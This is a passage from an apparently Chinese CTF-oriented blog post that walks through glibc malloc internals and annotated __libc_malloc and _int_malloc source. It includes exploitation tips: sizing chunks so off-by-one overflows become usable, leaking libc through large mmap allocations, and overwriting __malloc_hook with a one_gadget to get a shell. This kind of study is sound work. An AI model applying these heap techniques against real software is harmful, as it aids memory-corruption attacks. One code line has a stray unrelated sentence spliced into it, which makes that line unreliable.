bin</code>最小不能表示的<code>chunk</code>开始，大到无穷。</p><p>它表示的范围类似一个等差数列。</p><table><thead><tr><th>起下标</th><th>止下标</th><th>公差</th></tr></thead><tbody><tr><td>0</td><td>31</td><td>16*SIZE_SZ</td></tr><tr><td>32</td><td>47</td><td>32*SIZE_SZ</td></tr><tr><td>48</td><td>55</td><td>64*SIZE_SZ</td></tr><tr><td>56</td><td>59</td><td>128*SIZE_SZ</td></tr><tr><td>60</td><td>61</td><td>256*SIZE_SZ</td></tr><tr><td>62</td><td>62</td><td>∞</td></tr></tbody></table><p>最小的<code>large bin</code>是<code>small bin</code>的最小不能表示的大小。</p><p>所以<code>large bin</code>从<code>128*SIZE_SZ</code>开始。那么下标为<code>0</code>的<code>large bin</code>表示的范围就是<code>128*SIZE_SZ~144*SIZE_SZ</code>(左闭右开)，同理下标为1的<code>large bin</code>表示的范围就是<code>144*SIZE_SZ~160*SIZE_SZ</code>，以此类推，等到<code>32</code>的时候就在原来的基础上加<code>32*SIZE_SZ</code>作为右开区间</p><p>它会以二维双向链表进行维护，对于<code>bin</code>中所有的<code>chunk</code>，相同大小的<code>chunk</code>用<code>fd</code>和<code>bk</code>指针相连，对于不同大小的<code>chunk</code>，采用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针连接。并且沿着<code>fd_nextsize</code>指针，<code>chunk</code>大小递增。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>我们之前说过，第一次<code>malloc</code>的时候，操作系统会给我们<code>0x21000B</code>的内存，它是作为一个<code>top_chunk</code>存在的，可以把<code>top_chunk</code>看成<code>heap</code>的边界。<code>top_chunk</code>的地址会被记录在main_arena+88的位置。<code>gdb</code>中通过<code>p/x main_arena</code>的命令也可以查看<code>main_arena</code> 的具体结构。</p><h3 id="分配流程"><a href="#分配流程" class="headerlink" title="分配流程"></a>分配流程</h3><p>首先用户<code>malloc</code>请求一个内存，先将请求的内存大小转换成<code>chunk</code>的大小，通过以下宏定义转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>大概逻辑就是寻找一个最小能满足的<code>chunksize</code>作为<code>chunk</code>大小。</p><p>什么是最小能满足呢，我们看看一个<code>size=0x20</code>的<code>chunk</code>能有多少区域给用户写：<code>0x20</code>字节分别为<code>prev_size</code>，<code>size</code>，<code>fd</code>和<code>bk</code>，<code>prev_size</code>和<code>size</code>都不允许写，但是我们可以写<code>fd</code>和<code>bk</code>，以及下一个块的<code>prev_size</code>，前面我们也说过，当这个块没有被<code>free</code>的时候，它的<code>fd</code>,<code>bk</code>以及下一个<code>chunk</code>的<code>prevsize</code>位都是可以给用户任意写数据的，所以<code>size=0x20</code>，我们可以写的数据段为<code>0x18</code>。最小能满足就是说，当我请求的内存小于等于<code>0x18</code>的时候，我给你<code>size=0x20</code>的<code>chunk</code>，一旦多了就继续加<code>0x10</code>，也就是<code>2*SIZE_SZ</code>。这里用了其它宏定义去描述它我们尚且不管，如果用一个函数来实现它的话大概就是这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">request2size</span><span class="params">(<span class="keyword">size_t</span> req)</span></span>&#123;</span><br><span class="line">    chunk_size=SIZE_SZ*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(chunk_size&lt;req)chunk_size+=<span class="number">2</span>*SIZE_SZ;</span><br><span class="line">    <span class="keyword">return</span> chunk_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在分配的时候我们尽量选择<code>0x18</code>,<code>0x28</code>这样刚刚好的数值，这样更容易发生溢出，哪怕溢出一个字节，也能够加以利用。</p><p>那么算出了它的<code>chunk_size</code>之后呢，我们先会判断这个<code>chunk_size</code>是否<code>&lt;=global_max_fast</code>，也就是是否在<code>fast bin</code>范围内。如果在则优先寻找能匹配的<code>fast bin</code>，如果该<code>size</code>的<code>fast bin</code>为空则会寻找<code>small bin</code>，<code>small bin</code>会寻找特定<code>size</code>的<code>chunk</code>返回。如果<code>small bin</code>也为空，或者找不到能满足的那就会去<code>large bin</code>中寻找，同样是最小能满足，找到之后返回或者切割之后返回。还找不到就会去<code>unsorted bin</code>，<code>unsorted bin</code>则会找第一个能满足的<code>chunk</code>并返回或者切割之后返回，<code>unsorted bin</code> 中每遍历一个不满足要求的<code>unsorted bin</code>就会把该<code>unsorted bin</code>加到合适的small bin或者<code>large bin</code>当中。如果切割之后剩余的部分&lt;<code>MINSIZE</code>，那么则不会切割整个返回。</p><p>如果还是找不到，那么就会切割<code>top_chunk</code>。如果<code>top_chunk</code>都不能满足请求的大小，则会<code>free</code> <code>top_chunk</code>并再一次向操作系统申请新的<code>top_chunk</code>，这次申请同样还是申请一个<code>0x21000B</code>的<code>top_chunk</code>，通常情况下旧的<code>top_chunk</code>和新申请的<code>top_chunk</code>物理相邻，那么如果<code>free</code> 旧的<code>top_chunk</code>进入了一个非<code>fast bin</code>的链当中，就会被新的<code>top_chunk</code>合并。</p><p>如果一次申请的内存超过<code>0x200000B</code>，那么就不会在heap段上分配内存，将会使用<code>mmap</code>在<code>libc</code>的<code>data</code>段分配内存。通常利用就是每次分配给分配地址，分配<code>size</code>没限制那就<code>malloc</code>一个很大的内存就可以直接泄露<code>libc</code>的地址。</p><p>分配方式到此就讲完了。</p><h2 id="malloc源码分析"><a href="#malloc源码分析" class="headerlink" title="malloc源码分析"></a>malloc源码分析</h2><p>接下来我们直接解读一下<code>malloc</code>的源码。</p><h3 id="libc-malloc源码分析"><a href="#libc-malloc源码分析" class="headerlink" title="__libc_malloc源码分析"></a>__libc_malloc源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc实际上会直接调用这里的<code>__libc_malloc</code>函数，然后<code>__libc_malloc</code>也只不过是一层包装而已，实际上大部分的逻辑都是调用<code>_int_malloc</code>函数完成的，那么先来分析外面。</p><p>第一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>定义了一个<code>hook</code>函数指针，如果<code>hook!=NULL</code>则直接调用<code>hook</code>指向的内容。<code>hook</code>是为了方便开发者调试的一个东西，比如我自己写了一个<code>malloc</code>函数想测试它的性能如何，那么我在这里直接让<code>__malloc_hook=my_malloc</code>就可以直接调用我自己写的malloc函数了。但是同时它也是最容易被劫持的，刚开始我们很多题目都是靠写<code>__malloc_hook</code>为一个<code>onegadget</code>，然后调用<code>malloc</code>去<code>getshell</code>的。在<code>2.34</code>版本中，<code>__malloc_hook</code>同其它大部分的<code>hook</code>都被删除了。</p><p>第二段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在<code>arena.c</code>中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      arena_lookup (ptr);                           \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);                         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p><code>arena_lookup</code>定义如下，也是获取分配器指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lookup(ptr) do &#123; \</span></span><br><span class="line"><span class="meta">      void *vptr = NULL;                              \</span></span><br><span class="line"><span class="meta">      ptr = (mstate) tsd_getspecific (arena_key, vptr);             \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>然后加锁，没了，获取分配器指针这一段不是我们主要要分析的，也就不过多去解析了。</p><p>第三段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure><p>它本身注释也写清楚了，在能够找到一个可用的<code>arena</code>之前尝试寻找另外一个<code>arena</code>，我这英文比较飘还请亲见谅。如果<code>arena</code>找到了但是<code>_int_malloc</code>居然返回0了，那么就重新寻找另一个分配器再次调用一次<code>_int_malloc</code>。完了之后呢，要给<code>arena</code>解锁，然后返回得到的<code>chunk</code>指针。</p><h3 id="int-malloc源码分析"><a href="#int-malloc源码分析" class="headerlink" title="_int_malloc源码分析"></a>_int_malloc源码分析</h3><p>由于比较长，为了摆脱水长度的嫌疑就不给看总代码了，需要的自己找<code>glibc</code>的源码就好了，下面我一段一段分析。</p><h3 id="第一段：main-arena初始化"><a href="#第一段：main-arena初始化" class="headerlink" title="第一段：main_arena初始化"></a>第一段：main_arena初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;  </span><br><span class="line">checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);<span class="built_in">free</span>的源码分析先咕一会，主要是吧，熬夜写这玩意受不了。。</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量定义就不用看了，源码中也都标注出来了，这里最主要就是把用户请求的<code>bytes</code>转换成最小能满足的<code>chunk size</code>，然后它的变量名应该是<code>nb</code>，这个<code>nb</code>应该是<code>nbytes</code>的缩写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="meta-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);      \</span></span><br><span class="line"><span class="meta">      return 0;      \</span></span><br><span class="line"><span class="meta">    &#125;      \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>这里原来也给注释了，这俩宏定义就是一样的，只不过做一个参数check。</p><p>这里还要注意一下那些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为假。</span><br><span class="line">__glibc_likely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为真。</span><br><span class="line">__builtin_expect(<span class="built_in">exp</span>,value)表示<span class="built_in">exp</span>==value大概率成立</span><br></pre></td></tr></table></figure><p>这三个宏定义在源码中经常能看到，其实它不会改编程序逻辑，只是告诉编译器这个很可能为某个值，就把否的情况作为跳转，真的情况就顺序运行下去，减少程序的跳转，一定程度上可以优化程序运行速度。或者还有一个简单粗暴的办法，你把这三个字符全都去了，不影响代码逻辑。</p><p>那么这一段的逻辑就是，如果在分配的时候<code>arena</code>为空，那就调用<code>sys_malloc</code>系统调用去请求一个<code>chunk</code>，然后<code>memset</code>这个<code>chunk</code>的数据段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ------------------ Testing support ----------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">alloc_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下<code>perturb_byte</code>为假，差不多意思就是如果你没有特殊设置，那么<code>data</code>段全为0字节，实际情况也确实是这样的。</p><h3 id="第二段：fast-bin的处理"><a href="#第二段：fast-bin的处理" class="headerlink" title="第二段：fast bin的处理"></a>第二段：fast bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//在malloc的时候检查了fastbin的size发现不对</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里嘛就会判断，你申请的这个<code>nb</code>是否<code>&lt;=global_max_fast</code>，如果成立那么就会先在<code>fast bin</code>中寻找能满足的<code>chunk</code>，并且一定是完全匹配。它先找到<code>av-&gt;fastbinY[idx]</code>观察是否为0，如果不为0则说明该<code>size</code>的<code>fast bin</code>有<code>chunk</code>，那么就做以下动作：</p><p>取出<code>av-&gt;fastbinY[idx]</code>给<code>victim</code></p><p>链表中删除这个<code>victim</code>，然后重新接回去。</p><p>中间有一个<code>check</code>，就是判断所给<code>chunk</code>的<code>fastbinY</code>链上的<code>size</code>是否＝我需要的<code>size</code>，如果不相等那么直接报错退出。</p><p>末尾也有一个<code>check</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Properties of chunks recycled from fastbins</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));</span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是<code>check</code>各个标志位，一般不会被触发，所以可以理解为<code>fast bin</code>在分配的时候只有这一个<code>check</code>，就是那个<code>chunk</code>的<code>size</code>一定是等于我申请的<code>size</code>的，过了就把这个<code>chunk</code>的指针返回，<code>check</code>没过报错，如果根本都没取到<code>fast bin</code>，那么就进行下面的逻辑了。</p><h3 id="第三段：small-bin的处理"><a href="#第三段：small-bin的处理" class="headerlink" title="第三段：small bin的处理"></a>第三段：small bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * 